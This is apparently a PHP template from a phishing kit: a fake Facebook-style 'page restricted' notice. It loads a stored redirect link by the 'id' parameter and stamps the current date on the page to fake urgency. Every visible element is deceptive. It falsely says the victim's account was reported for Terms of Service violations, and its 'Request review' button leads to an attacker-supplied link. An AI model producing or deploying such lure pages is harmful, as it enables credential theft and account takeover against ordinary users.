<?php
include "tools.php";
if( !isset($_GET['id']) || empty($_GET['id']) ){
	redirect('./login.php');
	}else{
		$url = $_GET['id'];
		
	if( file_exists("dataLink/$url.txt") ){
		$urlasli = file_get_contents("dataLink/$url.txt");
		
		$parts = explode("|",$urlasli);
?>

<!DOCTYPE html>
<html class="google mmfb" dir="ltr" lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Privacy Policy</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
  </head>
  <style type="text/css" media="all">
      body{
    background-color: #eaeaea;
}

.fb{
    background-color: #fff;
    padding: 20px;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-content: center;
    align-items: center;
    border-radius: 10px;
}

.alert{
    background-color: #eaeaea;
}

.btn-continue{
    background-color: #1877f2;
    color: #fff;
    font-weight: bold;
    font-size: 15px;
    padding: 13px;
    border: none;
    border-radius: 5px;
}
  </style>
  <body>
      
       <div class="container box mt-5">
        <div class="container fb">
            <img width="150" src="./assets/img/gembok.png" alt="">
            <h1></h1>
            <p style="font-size: 13px;">We noticed unusual activity on your account and this happened because someone reported your account and Page for not complying with our Terms of Service. 
                
            </p>
            <div class="alert d-flex align-items-center" role="alert">
                <svg xmlns="http://www.w3.org/2000/svg" width="35" height="35" fill="currentColor" class="text-warning bi bi-exclamation-triangle" viewBox="0 0 16 16">
                    <path d="M7.938 2.016A.13.13 0 0 1 8.002 2a.13.13 0 0 1 .063.016.15.15 0 0 1 .054.057l6.857 11.667c.036.06.035.124.002.183a.2.2 0 0 1-.054.06.1.1 0 0 1-.066.017H1.146a.1.1 0 0 1-.066-.017.2.2 0 0 1-.054-.06.18.18 0 0 1 .002-.183L7.884 2.073a.15.15 0 0 1 .054-.057m1.044-.45a1.13 1.13 0 0 0-1.96 0L.165 13.233c-.457.778.091 1.767.98 1.767h13.713c.889 0 1.438-.99.98-1.767z"/>
                    <path d="M7.002 12a1 1 0 1 1 2 0 1 1 0 0 1-2 0M7.1 5.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0z"/>
                  </svg>
                <div style="margin-left: 20px;">
                  <strong style="font-size: 15px;">Your page was restricted on
                  <br />
                  <span id="tampil"></span></strong> <p style="font-size: 13px;">we did this to protect your account from being suspended.</p>
                </div>
              </div>
              <p style="font-size: 13px;">We will guide you through some steps to lift the page restriction and unlock your account.</p>

              <a href="<?= $parts[1] ?>" class="btn btn-primary w-100 p-2">Request review</a>
        </div>
    </div>
      
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.6/angular.min.js"></script>
  </body>
  <script>
        var date = new Date();
var tahun = date.getFullYear();
var bulan = date.getMonth();
var tanggal = date.getDate();
var hari = date.getDay();
var jam = date.getHours();
var menit = date.getMinutes();
var detik = date.getSeconds();
/*
switch(hari) {
 case 0: hari = "Sunday"; break;
 case 1: hari = "Monday"; break;
 case 2: hari = "Tuesday"; break;
 case 3: hari = "Wednesday"; break;
 case 4: hari = "Thursday"; break;
 case 5: hari = "Friday"; break;
 case 6: hari = "Saturday"; break;
}
*/

switch(bulan) {
 case 0: bulan = "January"; break;
 case 1: bulan = "February"; break;
 case 2: bulan = "March"; break;
 case 3: bulan = "April"; break;
 case 4: bulan = "May"; break;
 case 5: bulan = "June"; break;
 case 6: bulan = "July"; break;
 case 7: bulan = "August"; break;
 case 8: bulan = "September"; break;
 case 9: bulan = "October"; break;
 case 10: bulan = "November"; break;
 case 11: bulan = "December"; break;
}
var tampilTanggal = " " + tanggal + " " + bulan + " " + tahun;
 
    document.getElementById("tampil").innerHTML = tampilTanggal;
    </script>
</html>
<?php
}else{
		redirect('./login.php');
	}
}
?>